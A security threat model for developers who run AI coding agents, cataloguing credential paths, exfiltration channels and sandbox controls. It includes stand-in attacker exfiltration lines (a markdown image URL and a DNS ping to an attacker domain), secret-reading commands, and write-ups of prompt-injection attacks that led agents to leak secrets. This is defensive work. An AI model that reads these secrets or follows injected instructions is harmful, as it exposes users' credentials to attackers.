# Threat model: running AI coding agents on a developer machine

Harness-agnostic threat model and best-practice catalogue for developers who run agentic coding
tools (Claude Code, Codex CLI, OpenCode, Gemini CLI, Cursor, GitHub Copilot, Amazon Q, Windsurf,
Aider, …) against real repositories on real workstations, where the model provider may **retain,
review, or train on** the transcript.

- **Compiled:** 2026-08-30
- **Scope:** everything private that can reach model context from the *environment*, not just from
  tracked source; plus the controls that stop it or force a human decision.
- **Out of scope:** the provider's own retention terms (see the `repo-disclosure` skill in this
  repo for the disclosure/consent decision), model-weights security, and CI-only agents except
  where they share a mechanism.
- **Convention:** claims are cited inline. Anything not confirmed against a primary source is
  tagged `[unverified]`. Product behaviour changes fast — re-check version-specific claims.

---

## 0. Framing

### 0.1 Two distinct harms

Keep these separate, because they need different controls:

| | **Disclosure** | **Exfiltration** |
|---|---|---|
| What happens | Private data enters the transcript and is sent to the provider | Private data is pushed to a third party the agent contacted |
| Trigger | Ordinary agent operation (reading files, running commands) | Usually an *attack* (prompt injection) or a careless command |
| Who receives it | The model provider (retention/training risk) | An attacker |
| Primary control | Scope: what the agent may read, and what lands in tool output | Egress control + approval gates |

Anthropic states this explicitly for its own product: *"Isolation also does not change what is sent
to the model. Your prompts and the files Claude reads are transmitted to the Anthropic API or your
configured provider with or without a sandbox."*
([Choose a sandbox environment](https://code.claude.com/docs/en/sandbox-environments)). A sandbox is
an exfiltration control, **not** a disclosure control. Disclosure is governed by read scope alone.

### 0.2 Adversary and failure models

1. **No adversary — accidental disclosure.** The agent runs `printenv`, `cat .env`, `terraform
   show`, or a verbose test that dumps a connection string. The secret is now in a transcript held
   by a third party. This is the *most common* case and needs no attacker at all.
2. **Indirect prompt injection.** Untrusted text the agent reads — a repo file, a dependency's
   README, a GitHub issue, a fetched web page, an MCP tool description — carries instructions the
   model follows. OWASP LLM01:2025 Prompt Injection; NIST AI 100-2e2025 classifies indirect prompt
   injection as *"malicious instructions embedded in external data sources the model retrieves."*
   ([OWASP LLM Top 10](https://genai.owasp.org/llm-top-10/),
   [NIST AI 100-2](https://csrc.nist.gov/news/2025/nist-ai-100-2-adversarial-machine-learning-taxonom))
3. **Supply-chain compromise of the agent or its ecosystem.** A malicious npm postinstall, a
   compromised IDE extension, a poisoned MCP server, a malicious skill/rules file. See §7.
4. **Model error.** No injection, no attacker; the model simply does the wrong destructive or
   disclosing thing. Non-determinism means every "the model won't do that" control is probabilistic.

### 0.3 The load-bearing assumption

**An LLM cannot reliably separate instructions from data.** Simon Willison: models *"will happily
follow any instructions that make it to the model, whether or not they came from their operator."*
([The lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)). And on
detection-based defences: *"you can train a model on prompt injection examples and achieve 99%
detection … and that's useless, because in application security 99% is a failing grade."*
([CaMeL writeup](https://simonwillison.net/2025/Apr/11/camel/))

Corollary: **any control that depends on the model choosing to obey is not a control.** That demotes
`CLAUDE.md` / `AGENTS.md` instructions, ignore files, and "be careful" system prompts to hygiene,
not security. Only controls enforced *outside* the model — the OS, the network stack, the harness's
pre-execution rule engine, a hook — are enforceable.

---

## 1. Leak-surface taxonomy

What can end up in the transcript, grouped by where it lives. The severity column is the default
sensitivity of the surface, not a scan finding.

### (a) Files inside the repo / worktree

Includes untracked, ignored, and stale files — **a `.gitignore` entry does not hide a file from an
agent that reads the filesystem.** A clean `git status` proves nothing.

| Surface | Typical contents | Sev |
|---|---|---|
| `.env`, `.env.local`, `.env.*`, `.env.example` holding real values | DB URLs, API keys, JWT secrets, OAuth client secrets | Critical |
| `.envrc` (direnv), `.env.vault`, `.flaskenv` | Same, plus shell code that runs on `cd` | Critical |
| `*.pem`, `*.key`, `*.p12`, `*.pfx`, `*.jks`, `*.keystore`, `*.asc`, `*.gpg` | TLS / signing / private keys | Critical |
| `id_rsa`, `id_ed25519`, `id_ecdsa`, `*.ppk` committed into a repo | SSH private keys | Critical |
| `kubeconfig`, `.kube/config`, `*.kubeconfig` | Cluster endpoints + client certs/tokens | Critical |
| `terraform.tfstate`, `*.tfstate.backup`, `.terraform/`, `*.tfvars` | **State stores secrets in plaintext** — DB passwords, generated keys | Critical |
| `.npmrc`, `.yarnrc.yml`, `.pypirc`, `.netrc`, `.pgpass`, `.my.cnf` | Registry/publish tokens, DB passwords | Critical |
| `docker/config.json`, `.docker/config.json` | Registry auth (base64 basic auth, not encryption) | Critical |
| `serviceAccount*.json`, `gcp-*.json`, `*-credentials.json`, `firebase-adminsdk-*.json` | GCP service-account private keys | Critical |
| `.git/config` / `.git/credentials` with tokens in remote URLs | `https://x-access-token:ghp_…@github.com/...` | Critical |
| `.git/` generally: packed objects, reflog, `ORIG_HEAD`, stash | Secrets deleted from HEAD still live in history | High |
| Ansible vaults, `secrets.yml`, `sops` files with keys nearby | Infra credentials | High |
| CI config: `.github/workflows/*`, `.gitlab-ci.yml`, `Jenkinsfile` | Runner names, internal hostnames, occasionally inline secrets | Medium |
| IDE/editor: `.vscode/settings.json`, `.vscode/launch.json`, `.idea/`, `*.code-workspace` | Debug env vars, DB-tool connection strings, internal paths, usernames | High |
| Harness config: `.claude/settings*.json`, `.mcp.json`, `.cursor/mcp.json`, `.codex/`, `.gemini/settings.json`, `.opencode/` | **MCP server definitions frequently embed API tokens in `env`** | Critical |
| Jupyter notebooks `*.ipynb` | Outputs persist query results, dataframes with real PII, printed tokens | High |
| Logs: `*.log`, `npm-debug.log`, `yarn-error.log`, `logs/`, crash dumps, `*.stackdump` | Tokens in request logs, stack traces with env, absolute user paths | High |
| Fixtures / dumps: `*.sql`, `*.dump`, `*.bak`, `seed*.json`, `fixtures/`, `testdata/`, `*.csv`, `*.parquet` | **Real customer PII masquerading as test data** | Critical |
| Screenshots / recordings: `*.png` in `docs/`, Playwright/Cypress artifacts, `*.har` | Tokens visible in URLs; **`.har` files contain full auth headers and cookies** | Critical |
| Coverage/build artifacts embedding absolute paths | Username, machine layout, internal module names | Low |
| `node_modules/`, vendored deps | Usually public; but copied `.npmrc` and local-path packages leak | Low |
| Symlinks pointing outside the repo | Whatever the target holds — a common scope escape | High |
| `AGENTS.md`, `CLAUDE.md`, `.cursor/rules/*`, `.github/copilot-instructions.md`, skills | Injection carrier *and* a leak of internal process/infra detail | Medium |

### (b) Files outside the repo, commonly reachable

Most harnesses default to a **write** boundary at the working directory but a far wider **read**
boundary. Claude Code's sandbox documents the default as *"read access to the entire computer,
except certain denied directories. Note that this default still allows reading credential files such
as `~/.aws/credentials` and `~/.ssh/`."*
([Sandboxing](https://code.claude.com/docs/en/sandboxing)). Assume the same for every harness unless
you have configured otherwise.

**POSIX**

| Path | Contents | Sev |
|---|---|---|
| `~/.ssh/` (`id_*`, `config`, `known_hosts`) | Private keys; `config`/`known_hosts` map internal infra | Critical |
| `~/.aws/credentials`, `~/.aws/config`, `~/.aws/sso/cache/*.json` | Long-lived keys, SSO tokens, account IDs, role ARNs | Critical |
| `~/.config/gcloud/` (`credentials.db`, `application_default_credentials.json`, `access_tokens.db`) | GCP refresh tokens | Critical |
| `~/.azure/` (`msal_token_cache.json`, `azureProfile.json`) | Azure tokens, subscription and tenant IDs | Critical |
| `~/.kube/config` | Cluster CA + client key/token, internal API endpoints | Critical |
| `~/.docker/config.json`, `~/.docker/contexts/` | Registry creds, remote daemon endpoints | Critical |
| `~/.gnupg/` (`private-keys-v1.d/`) | Signing / encryption keys | Critical |
| `~/.netrc`, `~/.authinfo` | Plaintext host+login+password for many tools | Critical |
| `~/.git-credentials`, `~/.config/git/credentials` | Plaintext git host tokens | Critical |
| `~/.gitconfig` | `user.email`, `url.insteadOf` rewrites, internal remotes, signing key IDs | Medium |
| `~/.config/gh/hosts.yml`, `~/.config/hub` | GitHub OAuth tokens | Critical |
| `~/.npmrc`, `~/.pypirc`, `~/.cargo/credentials.toml`, `~/.gem/credentials`, `~/.m2/settings.xml`, `~/.gradle/gradle.properties`, `~/.nuget/NuGet.Config`, `~/.composer/auth.json` | Package-registry publish tokens | Critical |
| `~/.terraform.d/credentials.tfrc.json`, `~/.terraformrc` | Terraform Cloud tokens | Critical |
| `~/.config/hcloud`, `~/.doctl`, `~/.fly`, `~/.heroku`, `~/.railway`, `~/.vercel`, `~/.netlify`, `~/.config/supabase` | PaaS API tokens | Critical |
| `~/.bash_history`, `~/.zsh_history`, `~/.python_history`, `~/.psql_history`, `~/.mysql_history`, `~/.node_repl_history`, fish history | **Secrets typed on command lines**, internal hostnames, whole workflow | High |
| `~/.bashrc`, `~/.zshrc`, `~/.profile`, `~/.zshenv`, fish `config.fish` | `export API_KEY=…`; also a **persistence target** for a writing agent | Critical |
| Agent's own config/creds: `~/.claude/`, `~/.claude.json`, `~/.claude/.credentials.json`, `~/.codex/auth.json`, `~/.gemini/oauth_creds.json`, `~/.cursor/`, `~/.config/opencode/`, `~/.aider*` | Provider OAuth/API tokens, MCP definitions with secrets, **full session transcripts** | Critical |
| Browser profiles: Chrome `Login Data` / `Cookies`, Firefox `cookies.sqlite`, `Local Storage/leveldb` | Session cookies = account takeover without a password | Critical |
| Keychains/keyrings: `~/Library/Keychains/`, `~/.local/share/keyrings/`, GNOME/KWallet | OS credential store (encrypted at rest, but an agent-spawned process may inherit an unlocked session) | Critical |
| Password-manager state: `~/.password-store/`, `~/.config/1Password`, `~/.bw*` | Vault data / session tokens | Critical |
| Messaging/email stores, `~/Library/Messages/chat.db`, Slack app storage | Third-party personal data | Critical |
| `~/Documents`, `~/Downloads`, `~/Desktop` | Contracts, exports, screenshots, other clients' material | High |
| Sibling repos under `~/code`, `~/src`, `~/workspace` | **Other employers'/clients' confidential source** — an unintended scope escape | High |
| `/etc/hosts`, `/etc/resolv.conf`, `/etc/hostname`, `/etc/os-release` | Internal DNS names, split-horizon mappings, corp domains | Medium |
| `/etc/passwd`, `/etc/group` | Usernames, shells, home layout | Low |
| VPN/mesh state: `/etc/wireguard/`, `~/.config/tailscale`, `/etc/openvpn/` | Private keys, internal network map | Critical |
| `/var/run/docker.sock` | Root-equivalent access to the host; see §2 | Critical |

**Windows equivalents** (routinely missed by POSIX-shaped denylists — see §4)

| Path | Contents |
|---|---|
| `%USERPROFILE%\.aws`, `.ssh`, `.kube`, `.docker`, `.gnupg`, `_netrc` | Same as POSIX; Git Bash / WSL users have both trees |
| `%APPDATA%\npm\etc\npmrc`, `%APPDATA%\NuGet\NuGet.Config`, `%APPDATA%\gh\hosts.yml` | Registry and GitHub tokens |
| `%USERPROFILE%\.azure`, `%APPDATA%\gcloud` | Cloud tokens |
| `%APPDATA%\Microsoft\Credentials`, `%LOCALAPPDATA%\Microsoft\Credentials` | DPAPI credential blobs |
| `%LOCALAPPDATA%\Google\Chrome\User Data\Default\{Cookies,Login Data}`, Edge equivalents | Cookies / saved passwords |
| `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` | **The Windows `~/.bash_history`** — plaintext command history |
| `Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1` | `$env:` exports; persistence target |
| `HKCU:\Environment`, `HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment` | Persisted env vars incl. secrets, readable via `reg query` / `Get-ItemProperty` |
| `%USERPROFILE%\.claude`, `.codex`, `.cursor`, `%APPDATA%\Code\User\settings.json` | Agent + IDE config and transcripts |
| `\\wsl$\...` and `/mnt/c/...` cross-boundary paths | WSL sees the Windows profile and vice versa; a sandbox usually covers only one side |

Windows caveat: Claude Code's Bash sandbox **does not support native Windows** (macOS, Linux, WSL2
only) ([Sandboxing](https://code.claude.com/docs/en/sandboxing)), and Anthropic warns against
letting it reach `\\*` WebDAV paths because that *"may allow Claude Code to trigger network requests
to remote hosts, bypassing the permission system"*
([Security](https://code.claude.com/docs/en/security)). On Windows hosts the practical isolation
options are a container, a VM, or WSL2.

### (c) Process and environment state

Sandboxed subprocesses **inherit the parent environment by default**, credentials included
([Sandboxing → Scope](https://code.claude.com/docs/en/sandboxing)). A single `env` dumps everything.

Secret-bearing env-var name patterns (usable as both a scrub list and a scanner signature):

```
*_KEY  *_KEYS  *_SECRET  *_SECRETS  *_TOKEN  *_PASSWORD  *_PASSWD  *_PWD  *_CREDENTIAL*
*_API_KEY  *_ACCESS_KEY  *_PRIVATE_KEY  *_CLIENT_SECRET  *_AUTH  *_SESSION  *_COOKIE
*_DSN  *_URI  *_URL          # DATABASE_URL, REDIS_URL, AMQP_URL — creds embedded in userinfo
AWS_*  (ACCESS_KEY_ID, SECRET_ACCESS_KEY, SESSION_TOKEN, PROFILE)
GOOGLE_APPLICATION_CREDENTIALS  GCP_*  GCLOUD_*  AZURE_*  ARM_*
GITHUB_TOKEN  GH_TOKEN  GITLAB_TOKEN  BITBUCKET_*  CI_JOB_TOKEN
NPM_TOKEN  PYPI_TOKEN  TWINE_PASSWORD  CARGO_REGISTRY_TOKEN  NUGET_API_KEY  DOCKER_PASSWORD
ANTHROPIC_API_KEY  OPENAI_API_KEY  GEMINI_API_KEY  GOOGLE_API_KEY  HF_TOKEN  REPLICATE_API_TOKEN
STRIPE_*  TWILIO_*  SENDGRID_*  SLACK_*  DATADOG_*  NEW_RELIC_*  SENTRY_AUTH_TOKEN
VAULT_TOKEN  CONSUL_HTTP_TOKEN  NOMAD_TOKEN  TF_VAR_*  KUBECONFIG
SSH_AUTH_SOCK        # not a secret itself: a handle to the agent's live keys
```

Reachable via `env`, `printenv`, `set`, `export -p`, `declare -x`, PowerShell `Get-ChildItem Env:` /
`$env:X`, `/proc/self/environ`, `/proc/<pid>/environ` (same-uid processes), `ps auxwwe`,
`/proc/<pid>/cmdline` (secrets passed as CLI args), `docker inspect`, `systemctl show-environment`,
`launchctl getenv`, and any script the agent writes (`process.env`, `os.environ`). Note that most
"read-only command" allowlists include `cat`, so `cat /proc/self/environ` is auto-approved on many
setups `[unverified per harness]`.

Also here: `lsof -i` (every open connection), `ps` (other running work), shell `history`.

### (d) Machine and human identity

Individually low-severity, collectively a fingerprint that de-anonymises a transcript and maps an
employer's internal estate.

| Signal | How it leaks |
|---|---|
| Username | Every absolute path in every tool output: `/home/alice/...`, `C:\Users\sebin\...` |
| Hostname | `hostname`, `uname -a`, `/etc/hostname`, prompts captured in output; corp schemes like `ACME-LT-4417` |
| Real name + email | `git config user.email`, `git log`, commit trailers, `~/.gitconfig` |
| Local IP / subnet / interfaces | `ifconfig`, `ip a`, `ipconfig /all`, `hostname -I`, `netstat -rn` — reveals corporate VLAN structure |
| Public IP / geolocation / ISP | `curl ifconfig.me`, `curl ipinfo.io`, `dig +short myip.opendns.com` — **also an active exfil channel (§2)** |
| MAC addresses | `ip link`, `ifconfig`, `getmac` — stable hardware identifier |
| OS / kernel / build fingerprint | `uname -a`, `sw_vers`, `systeminfo`, `/etc/os-release` |
| Timezone + locale | `date`, `timedatectl`, `TZ` — narrows physical location |
| Installed-software inventory | `brew list`, `pip freeze`, `dpkg -l`, `Get-Package` — org tooling profile |
| Domain join / directory | `whoami /groups`, `klist`, `dsregcmd /status`, `id`, `groups` — AD domain, group membership |
| VPN / mesh identity | `tailscale status`, `wg show` — internal host inventory |
| Cloud identity | `aws sts get-caller-identity`, `gcloud config list`, `az account show`, `kubectl config current-context` |

### (e) Network-reachable systems

The agent runs *inside* your trust perimeter. It is a confused deputy holding your VPN, your session
cookies, and your ambient cloud auth.

- **Localhost services** — dev DB (`5432`, `3306`, `27017`, `6379`), Elasticsearch `9200`, admin
  UIs, staging proxies. `curl localhost:9200/_search` returns real data with no auth on most dev
  setups.
- **Cloud instance metadata: `169.254.169.254`** (also `metadata.google.internal`, IPv6
  `fd00:ec2::254`). One unauthenticated GET on IMDSv1 yields temporary IAM credentials for the
  instance role. IMDSv2's PUT-then-GET token handshake blocks *blind* SSRF, but an agent with full
  request control completes the handshake trivially — treat IMDSv2 as defence in depth, not a
  boundary ([Datadog Security Labs](https://securitylabs.datadoghq.com/articles/misconfiguration-spotlight-imds/),
  [AWS Security Blog](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/)).
  **This makes cloud dev boxes and CI runners materially more dangerous than laptops.**
- **Internal DNS / service discovery** — `dig`, `nslookup`, `host`, Consul, `.internal` zones;
  enumerating them maps the estate (and see §2 for DNS as an exfil channel).
- **Databases via connection strings found in (a)/(c)** — the agent needn't put the password in the
  transcript; it can query and paste the rows.
- **Docker socket** `/var/run/docker.sock` — Anthropic's own docs: allowing it *"effectively grants
  access to the host system through the Docker socket"*
  ([Sandboxing → Security limitations](https://code.claude.com/docs/en/sandboxing)). Same for the
  Podman/containerd sockets, a remote `DOCKER_HOST`, and kubelet `:10250`.
- **Kubernetes** — a valid `~/.kube/config` enables `kubectl get secrets -A`, `exec` into prod pods,
  and port-forwards into the cluster network.
- **Corporate intranet over VPN** — Jira, Confluence, wikis, internal registries, admin panels, all
  reachable with the developer's ambient session.
- **SSH agent forwarding** (`SSH_AUTH_SOCK`) — lets the agent authenticate as you to any host your
  keys open, without ever reading a key file.

### (f) Tool output (the quiet majority of real-world leaks)

Everything a command prints enters context verbatim.

- **Test output**: fixtures with real PII, `DEBUG` logging that prints headers, failing assertions
  echoing a request body with `Authorization: Bearer …`.
- **Verbose builds**: `npm ci --verbose`, `pip install -v` print resolved registry URLs *with
  embedded tokens* when `.npmrc`/`.pypirc` uses userinfo auth.
- **Stack traces**: absolute paths (username), framework env dumps, DSNs in DB driver errors.
- **`git log` / `git show`**: sensitive commit messages, the whole team's author emails, and
  **secrets deleted from HEAD but alive in history**.
- **`git remote -v`**: `https://user:ghp_xxx@github.com/org/private.git` — a live token printed by a
  command nearly every harness auto-approves as read-only.
- **Infra tooling**: `docker inspect`, `docker compose config` (resolves `${VARS}` to plaintext),
  `kubectl describe`, `kubectl get secret -o yaml` (base64 is not encryption), `terraform
  plan`/`show`, `helm get values`.
- **Identity commands**: `aws sts get-caller-identity`, `gcloud config list`, `az account show`,
  `gh auth status`.
- **`curl -v`** printing request headers including bearer tokens.
- **Crash dumps / core files / `.stackdump`** — raw process memory fragments.
- **Agent-authored scripts.** A one-off Python/Node script the agent writes and runs is not matched
  by command-pattern rules at all and can open any file the process can open. Anthropic: Read and
  Edit deny rules *"don't apply to arbitrary subprocesses that read or write files indirectly, like
  a Python or Node script that opens files itself"*
  ([Permissions](https://code.claude.com/docs/en/permissions)).

### (g) Connected tools: MCP servers and ambient-auth CLIs

**MCP servers** widen every axis at once — read scope, write scope, *and* egress:

- filesystem servers (often rooted well above the repo), database servers (direct prod/staging
  query), Slack/email/calendar servers (third-party personal data), browser and computer-use servers
  (your logged-in sessions), issue-tracker servers.
- MCP definitions in `.mcp.json` / `.cursor/mcp.json` routinely carry API tokens in an `env` block —
  the config file is itself a Critical leak surface.
- **Tool descriptions are untrusted input.** Invariant Labs demonstrated *tool poisoning* — hidden
  instructions in a tool description that the model reads and the user never sees — and a "rug
  pull" where a WhatsApp MCP server served benign descriptions on first load and malicious ones
  later ([MCP tool poisoning](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks),
  [mcp-injection-experiments](https://github.com/invariantlabs-ai/mcp-injection-experiments)).
- Vendors disclaim review of third-party servers; Anthropic *"does not security-audit or manage any
  MCP server"* ([Security → MCP security](https://code.claude.com/docs/en/security)).
- Scope matters more than server quality. The GitHub MCP exploit needed no server bug: an issue in a
  public repo instructed the agent, which used **the same PAT** to read private repos and publish
  the contents in a public PR ([Invariant Labs](https://invariantlabs.ai/blog/mcp-github-vulnerability),
  [github-mcp-server#844](https://github.com/github/github-mcp-server/issues/844)). The recommended
  mitigations are architectural: one repository per session, least-privilege tokens, runtime
  guardrails.

**CLIs with ambient auth** are MCP servers without the protocol: `gh`, `glab`, `aws`, `gcloud`,
`az`, `kubectl`, `docker`, `terraform`, `vercel`, `fly`, `heroku`, `stripe`, `psql`/`mysql` backed
by `~/.pgpass`, `op`/`bw` (password-manager CLIs), and `ssh`. Each is a live authenticated channel
into a production system, reachable by one innocuous-looking command.

### (h) The agent's own memory, transcripts, and session files

Self-referential and easy to forget:

- **Session transcripts on disk** (`~/.claude/projects/**`, `~/.codex/sessions/**`, Cursor local
  state, spilled tool-result files). These contain everything the agent has ever read — reading one
  re-discloses months of prior work. They are exactly what the s1ngularity malware targeted (§7).
- **Memory files** (`CLAUDE.md`, `AGENTS.md`, memory stores) — persistent, and therefore a
  **prompt-injection persistence mechanism**: an injected instruction written into memory re-fires
  every session.
- **Cross-project bleed**: user-scope config and memory apply in *every* repo, so a rule or fact
  learned in one client's project follows the agent into another's.
- **Telemetry / OpenTelemetry exporters / crash reporting** may ship prompt and tool metadata to a
  third destination.
- **Sub-agents inherit the parent's boundary.** Claude Code: *"subagents run in the same process as
  the parent session and use the same sandbox configuration"*
  ([Sandboxing](https://code.claude.com/docs/en/sandboxing)). Delegating does not narrow scope.
- **Background tasks and hooks** keep running after you stop watching.

---

## 2. Exfiltration channels

Disclosure to the provider happens through the transcript. *Exfiltration to an attacker* needs a
channel out. Enumerate them, because an egress allowlist is only as good as its coverage.

### 2.1 The lethal trifecta

Simon Willison's framing, June 2025 — an agent is exploitable when it combines:

1. **Access to private data** (any of §1),
2. **Exposure to untrusted content** (repo files, dependency READMEs, issues/PRs, fetched pages,
   MCP tool descriptions, error messages from remote services),
3. **The ability to communicate externally.**

*"If an agent holds any two of these capabilities it stays safe. If it has all three, an attacker
who controls the untrusted content can read private data and transmit it out."*
([The lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/))

**A coding agent has all three by default.** It reads your filesystem, it reads code and issues
written by other people, and it can run `curl`. This is why *read-only access is not a safe
posture*: read-only + a shell is still the full trifecta, because the shell is the exit.

Related framings worth citing in a report: OWASP LLM01 (Prompt Injection), LLM02 (Sensitive
Information Disclosure), LLM06 (Excessive Agency) ([OWASP LLM Top 10 2025](https://genai.owasp.org/llm-top-10/));
the OWASP Agentic Security Initiative's *Agentic AI — Threats and Mitigations*
([genai.owasp.org](https://genai.owasp.org/resource/agentic-ai-threats-and-mitigations/)) and the
Top 10 for Agentic Applications (ASI01–ASI10, Dec 2025)
([announcement](https://genai.owasp.org/2025/12/09/owasp-genai-security-project-releases-top-10-risks-and-mitigations-for-agentic-ai-security/));
NIST AI 100-2e2025 for the attack taxonomy
([CSRC](https://csrc.nist.gov/news/2025/nist-ai-100-2-adversarial-machine-learning-taxonom)) and
NIST SP 800-218A for SSDF-aligned GenAI development practice
([CSRC](https://csrc.nist.gov/pubs/sp/800/218/a/final)).

Aim Security's **EchoLeak** (CVE-2025-32711, CVSS 9.3) named the same shape as "LLM scope
violation": untrusted input causing the model to reach data it was legitimately entitled to and send
it out, zero-click, entirely in natural-language space so AV/firewall/static scanning never sees it
([HackTheBox writeup](https://www.hackthebox.com/blog/cve-2025-32711-echoleak-copilot-vulnerability)).

### 2.2 Channel inventory

| Channel | Mechanism | Notes |
|---|---|---|
| **Outbound HTTP from the shell** | `curl`, `wget`, `nc`, `ncat`, `socat`, `telnet`, `openssl s_client`, `python -c "import requests"`, `node -e "fetch(...)"`, `perl`, `php -r`, `Invoke-WebRequest`/`iwr`/`curl.exe`, `bitsadmin`, `certutil -urlcache` | The default channel. Blocking `curl` alone is theatre — a dozen interpreters remain |
| **The harness's own fetch/browser tool** | `WebFetch`, `web_search`, browser MCP, computer use | Data can be encoded into the *URL path or query*, so even a GET is an exfil |
| **Markdown image / link rendering** | `![x](https://attacker/?d=<secret>)` rendered by the chat UI | Classic zero-click exfil; several vendors now proxy or strip images `[unverified per product]` |
| **DNS** | `ping <secret>.attacker.tld`, `nslookup`, `dig`, `host`, or any resolver call | **Bypasses HTTP allowlists entirely.** Demonstrated against Claude Code as CVE-2025-55284: prompt injection encoded `.env` contents into subdomains of DNS queries via auto-approved `ping`/`nslookup`/`dig`; fixed by removing those from the allowlist ([Embrace The Red](https://embracethered.com/blog/posts/2025/claude-code-exfiltration-via-dns-requests/)) |
| **MCP servers** | Any server with network or messaging capability: Slack, email, browser, HTTP-fetch, "memory" servers | Frequently *outside* the harness's own egress control — GitHub's Copilot firewall *"does not apply to Model Context Protocol (MCP) servers"* ([GitHub Docs](https://docs.github.com/en/copilot/how-tos/use-copilot-agents/coding-agent/customize-the-agent-firewall)) |
| **git push to a remote** | Push a branch containing the secrets; or add an attacker remote; or `git config url.insteadOf` | The GitHub MCP heist exfiltrated via **a PR in a public repo** — no external host contacted at all |
| **Creating a public repo / gist / issue / PR comment** | `gh repo create --public`, `gh gist create`, posting an issue body | s1ngularity used exactly this: loot pushed to a repo in the *victim's own* GitHub account |
| **Package publish** | `npm publish`, `pip upload`/`twine`, `cargo publish`, `gem push`, `docker push`, `nuget push` | Publishes secrets *and* can poison downstream consumers |
| **Cloud writes with ambient auth** | `aws s3 cp`, `gcloud storage cp`, `az storage blob upload`, `kubectl cp` | Uses your credentials; often to an attacker-controlled but *legitimate-looking* bucket |
| **Email / chat / issue trackers via CLI or MCP** | `sendmail`, `mail`, Slack webhook, Teams webhook | Human-readable channels avoid all network-tooling heuristics |
| **Writing to a shared/synced path** | `~/Dropbox`, OneDrive, iCloud Drive, a network share, `/tmp` on a shared host | No network call from the agent at all |
| **Second-order: persistence** | Writing `.git/hooks/*`, `.bashrc`, `.claude/settings.json`, `.mcp.json`, a file on `$PATH` | The exfil happens *later*, outside the session. Anthropic's sandbox-runtime denies `.git/hooks`, `.git/config`, `.mcp.json`, `.claude/commands`, `.claude/agents` and shell startup files by default for exactly this reason ([Sandbox environments](https://code.claude.com/docs/en/sandbox-environments)) |
| **Domain fronting / SNI tricks through an allowlist proxy** | Client-supplied hostname is trusted by a non-TLS-terminating proxy | Anthropic documents this against its own sandbox: *"code running inside the sandbox can potentially use domain fronting or similar techniques to reach hosts outside the allowlist"* ([Sandboxing](https://code.claude.com/docs/en/sandboxing)) |
| **Broad allowlist abuse** | Anything user-writable on an allowed domain: a gist on `github.com`, a paste on an allowed CDN, a `*.npmjs.org` package | *"Allowing broad domains such as `github.com` can create paths for data exfiltration"* (ibid.) |

### 2.3 Why read-only access is not enough

Three compounding reasons:

1. **The trifecta.** Read + untrusted content + any egress = exploitable. The shell is egress.
2. **Argument injection defeats command allowlists.** Trail of Bits achieved RCE in three agent
   platforms by manipulating *arguments* to already-approved commands (e.g. `go test -exec`, `git
   show` + ripgrep flag combinations), bypassing human-in-the-loop with a single prompt
   ([Prompt injection to RCE in AI agents](https://blog.trailofbits.com/2025/10/22/prompt-injection-to-rce-in-ai-agents/)).
   Their conclusion: sandboxing is the primary control; allowlists must be drastically small; use
   `--` separators; audit against GTFOBins.
3. **Denylists lose.** Backslash Security showed Cursor's auto-run denylist could be bypassed with
   base64-encoded commands and subshells; Cursor subsequently deprecated the denylist in favour of
   an allowlist ([Backslash](https://www.backslash.security/blog/cursor-ai-security-flaw-autorun-denylist),
   [The Register](https://www.theregister.com/2025/07/21/cursor_ai_safeguards_easily_bypassed/)).
   Anthropic makes the same point about argument-constraining patterns: *"Bash permission patterns
   that try to constrain command arguments are fragile"*
   ([Permissions](https://code.claude.com/docs/en/permissions)).

And the architectural mitigations that *do* hold are structural, not model-level: Google DeepMind's
CaMeL uses a privileged planner LLM plus a quarantined LLM with no tool access, and a capability
-tracking interpreter that tags each value's provenance and applies policy on data lineage
([Willison on CaMeL](https://simonwillison.net/2025/Apr/11/camel/)).

---

## 3. Control catalogue, ranked by enforceability

Ranked strongest → weakest. **The ranking is the point:** controls low in this list are routinely
mistaken for controls high in it.

### Tier 1 — OS-enforced isolation

*Mechanisms:* macOS Seatbelt (`sandbox-exec`), Linux bubblewrap + seccomp + Landlock, containers /
dev containers, VMs and microVMs (Firecracker), Windows Sandbox or WSL2.

Concrete implementations:
- **Claude Code**: built-in Bash sandbox (Seatbelt on macOS; bubblewrap + optional seccomp on
  Linux/WSL2; **no native Windows**), configured under `sandbox.filesystem.{allowRead, denyRead,
  allowWrite, denyWrite, disabled}` and `sandbox.network.{allowedDomains, deniedDomains,
  allowUnixSockets, tlsTerminate}`; plus `@anthropic-ai/sandbox-runtime` which wraps the *whole*
  process (file tools, hooks, MCP servers) rather than only Bash
  ([Sandboxing](https://code.claude.com/docs/en/sandboxing),
  [Sandbox environments](https://code.claude.com/docs/en/sandbox-environments)).
- **Codex CLI**: `sandbox_mode = "read-only" | "workspace-write" | "danger-full-access"` with
  `approval_policy = "untrusted" | "on-request" | "never"`, `sandbox_workspace_write.writable_roots`;
  Seatbelt on macOS, bubblewrap + seccomp/Landlock on Linux/WSL2, Windows Sandbox on Windows
  ([OpenAI Codex sandboxing](https://developers.openai.com/codex/sandboxing)).
- **Gemini CLI**: `-s`/`--sandbox`, `GEMINI_SANDBOX=true|docker|podman|sandbox-exec|runsc|lxc`, or
  `"sandbox": true` in settings; Seatbelt profiles `permissive-open` (default), `permissive-proxied`,
  `restrictive-open`, `restrictive-proxied`, `strict-open`, `strict-proxied`; container mode mounts
  cwd at the same absolute path ([gemini-cli/docs/cli/sandbox.md](https://github.com/google-gemini/gemini-cli/blob/main/docs/cli/sandbox.md)).
  **Note the default profile allows unrestricted outbound network** — pick a `*-proxied` profile.

**Stops:** arbitrary subprocesses reading credential paths; agent-authored scripts; most destructive
writes outside the boundary; (with network isolation) unapproved egress.

**Does not stop:** disclosure to the provider (files you *do* allow are still transmitted); anything
reachable on an allowed domain; DNS if the resolver is permitted; domain fronting past a
non-TLS-terminating proxy; Unix-socket escapes (`docker.sock`); privilege escalation via writable
`$PATH` dirs or shell rc files; and — per Trail of Bits' August 2026 result — **a sufficiently
capable agent chaining 0-days out of a VM** ([VMs won't contain cyber-capable agents](https://blog.trailofbits.com/2026/08/26/vms-wont-contain-cyber-capable-agents/)).
Anthropic's own caveat: *"Effective sandboxing requires both filesystem and network isolation.
